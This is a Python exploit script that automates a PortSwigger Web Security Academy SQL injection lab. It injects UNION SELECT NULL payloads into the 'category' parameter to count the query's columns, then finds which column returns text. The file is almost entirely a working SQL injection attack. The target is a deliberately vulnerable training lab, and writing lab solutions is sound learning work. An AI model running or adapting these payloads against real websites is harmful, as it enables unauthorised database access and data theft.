#!/usr/bin/python3

from time import sleep
import re
import sys
import logging
import argparse
import urllib3
import urllib.parse
import urllib.request

from colorama import Fore, Style
import requests

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

PROXIES = {
    "http": "127.0.0.1:8080",
    "https": "127.0.0.1:8080",
}

log = logging.getLogger(__name__)
logging.basicConfig(
    stream=sys.stdout,
    level=logging.INFO,
    format=Fore.BLUE + "[{asctime}] {message}",
    style="{",
    datefmt= Fore.BLUE + "%H:%M:%S",
)

def normalize_url(url):
    if not url.endswith("/"): 
        url = url + "/"
    return url

def is_url_reachable(url):
    try:
        urllib.request.urlopen(url)
        return True
    except:
        return False
    
def check_if_already_been_solved(url) :
    response = requests.get(url, verify=False)
    if "Congratulations, you solved the lab!" in response.text:
        print("\n")
        log.info(Style.BRIGHT  + Fore.WHITE + "[" + Fore.GREEN + "+" + Fore.WHITE + "]" + Style.BRIGHT + Fore.YELLOW + " The Lab has already been solved !!" + "\n" + Fore.WHITE)
        sys.exit(0)

def Get_string(url, no_proxy) :
    if (no_proxy) :
        resp = requests.get(url)
    else:
        resp = requests.get(url, proxies=PROXIES, verify=False)

    pattern = r"<p id=\"hint\">Make the database retrieve the string: '(.+?)'</p>"
    string = re.search(pattern, resp.text)

    return string.group(1)

def Send_Payload(url, uri, session, payload, no_proxy):

    if no_proxy:
        r = session.get(url + uri + payload, verify=False)
    else:
        r = session.get(url + uri + payload, verify=False, proxies=PROXIES)

def check_response_code(url, uri, session, payload, no_proxy):
    if no_proxy:
        resp = session.get(url + uri + payload)
    else:
        resp = session.get(url + uri + payload, proxies=PROXIES, verify=False)
    
    return resp.status_code
    
def is_solved(url, session, no_proxy):
    def Get_Response(s, url, no_proxy):
        if no_proxy:
            resp = s.get(url)
        else:
            resp = s.get(url, proxies=PROXIES, verify=False)
        if "Congratulations, you solved the lab!" in resp.text:
            return True
        
    solved = Get_Response(session, url, no_proxy)
    if solved:
        return True
    else:
        sleep(2)
        Get_Response(session, url, no_proxy)

if __name__ == "__main__":
    
    try: 
        parser = argparse.ArgumentParser(description="Usage Example: python3 SQLi-Lab#4.py --url https://0a2100.web-security-academy.net/ --no-proxy")
        parser.add_argument("-u", "--url", help="Enter the Lab URL", required=True)
        parser.add_argument("-n", "--no-proxy", help="Do not use proxy", default=False, action="store_true")
        args = parser.parse_args()

        url = normalize_url(args.url)
        uri = "filter?category="

        banner = Style.BRIGHT + Fore.BLUE + f"""
{'-'*100}
# Platform          : Web Security Academy Portswigger			
# Web Vulnerability : SQL Injection
# Type              : Server-side
{'-'*100}
{'-'*100}
# Lab #4            : SQL injection UNION attack
# Lab Level         : Practitioner
# Link              : https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text
{'-'*100}
        """
        print(banner)
        sleep(1)
        log.info(Fore.WHITE + "[" + Fore.BLUE + "*" + Fore.WHITE + "]" + " Target URL: " + url)
        sleep(1)
        log.info(Fore.WHITE + "[" + Fore.BLUE + "*" + Fore.WHITE + "]" + " Testing connection to the target URL")

        if is_url_reachable(url):

            check_if_already_been_solved(url)           # Checking if the Lab has already been solved
            
            session = requests.Session()
            string = "'" + Get_string(url, args.no_proxy) + "'"

            log.info(Fore.WHITE + "[" + Fore.BLUE + "*" + Fore.WHITE + "]" + " Testing the GET parameter 'category'")
            sleep(1)
            log.info(Style.BRIGHT  + Fore.WHITE + "[" + Fore.GREEN + "+" + Fore.WHITE + "]" + Style.BRIGHT + Fore.WHITE + " GET parameter " + Fore.GREEN + 'category' + Fore.WHITE + " is vulnerable to SQLi UNION attacks")
            sleep(1)
            log.info(Style.BRIGHT  + Fore.WHITE + "[" + Fore.GREEN + "*" + Fore.WHITE + "]" + Style.BRIGHT + Fore.WHITE + " Finding the number of columns ...")

            columns = 1
            while True:
                payload1 = "'+UNION+SELECT+" + "NULL,"*(columns-1) + "NULL--"       # Payload to find the number of columns returned by the query
                
                log.info(Style.BRIGHT + Fore.WHITE + "[" + Fore.GREEN + "+" + Fore.WHITE +  "]" + Fore.WHITE + " Injecting the payload: " + Style.BRIGHT + Fore.RED + payload1 + Fore.WHITE + " and sending ...")
                Send_Payload(url, uri, session, payload1, args.no_proxy)
                if check_response_code(url, uri, session, payload1, args.no_proxy) == 500:
                    log.info(Fore.WHITE + "[" + Fore.BLUE + "*" + Fore.WHITE + "]"  + Fore.RED + " Failed!!" + Fore.WHITE + " Incrementing the number of NULL values")
                    columns += 1
                    if (columns >=10):
                        log.info(Fore.WHITE + "[" + Fore.RED + "-" + Fore.WHITE + "]" + Style.BRIGHT + Fore.RED + " SQL injection unsuccessful :)")
                        sys.exit(-1)

                else: 
                    log.info(Fore.WHITE + "[" + Fore.GREEN + "+" + Fore.WHITE + "]" + Style.BRIGHT + Fore.WHITE + " The " + Fore.GREEN + "number " + Fore.WHITE + "of columns returned by the query is: " + Style.BRIGHT + Fore.CYAN + str(columns))
                    print("\n")
                    sleep(1)
                    break

            log.info(Style.BRIGHT  + Fore.WHITE + "[" + Fore.BLUE + "*" + Fore.WHITE + "]" + Style.BRIGHT + Fore.WHITE + " Searching for columns containing string data ...")
            sleep(1)
            log.info(Style.BRIGHT  + Fore.WHITE + "[" + Fore.BLUE + "*" + Fore.WHITE + "]" + Style.BRIGHT + Fore.WHITE + " Retrieving the string provided in the Lab: " + Style.BRIGHT + Fore.CYAN + string)
            
            for i in range(columns) :
                null_count = columns -i -1
                nulls = "NULL," * null_count
                payload2 = "'+UNION+SELECT+" + nulls + string + ",NULL" * i + "--"   # Payload to find columns that contains string data
                sleep(1)

                log.info(Style.BRIGHT + Fore.WHITE + "[" + Fore.GREEN + "+" + Fore.WHITE +  "]" + Fore.WHITE + " Injecting the payload: " + Style.BRIGHT + Fore.RED + payload2 + Fore.WHITE + " and sending ...")
                Send_Payload(url, uri, session, payload2, args.no_proxy)
            
                if check_response_code(url, uri, session, payload2, args.no_proxy) == 200 :
                    log.info(Fore.WHITE + "[" + Fore.GREEN + "+" + Fore.WHITE + "]" + Style.BRIGHT + Fore.WHITE + " Found a column containing" + Fore.GREEN + " string " + Fore.WHITE + "data: " + Style.BRIGHT + Fore.CYAN + "Column n° "+ str(i+1) + "\n")
                    break

            if is_solved(url, session, args.no_proxy) :
                log.info(Fore.WHITE + "[" + Fore.GREEN + "+" + Fore.WHITE + "]" + Style.BRIGHT + Fore.WHITE + " SQL injection exploited successfully :)")
                log.info(Fore.WHITE + "[" + Fore.GREEN + "+" + Fore.WHITE + "]" + Style.BRIGHT + Fore.WHITE + " The Lab should now be solved. Congrats !" + "\n")

            else:
                log.info(Fore.WHITE + "[" + Fore.RED + "-" + Fore.WHITE + "]" + Style.BRIGHT + Fore.RED + " SQL injection unsuccessfull :(" + "\n" + Fore.WHITE)
                sys.exit(-1)
                    
        else: 
            print("\n")
            log.info(Style.BRIGHT + Fore.WHITE + "[" + Fore.RED + "-" + Fore.WHITE + "]" + Style.BRIGHT + Fore.RED + " Unable to connect to the target URL")
            log.info(Style.BRIGHT + Fore.WHITE + "[" + Fore.RED + "-" + Fore.WHITE + "]" + Style.BRIGHT + Fore.RED + " If the problem persists, please check if the provided target URL is reachable." + "\n" + Fore.WHITE)
            sys.exit(-1)

    except KeyboardInterrupt:
        print("\n")
        log.info(Fore.RED + "[-] The exploit has been INTERRUPTED !" + "\n" + Fore.WHITE)

    except Exception as e:
        log.info(Fore.RED + "[-] " + str(e) + "\n" + Fore.WHITE)
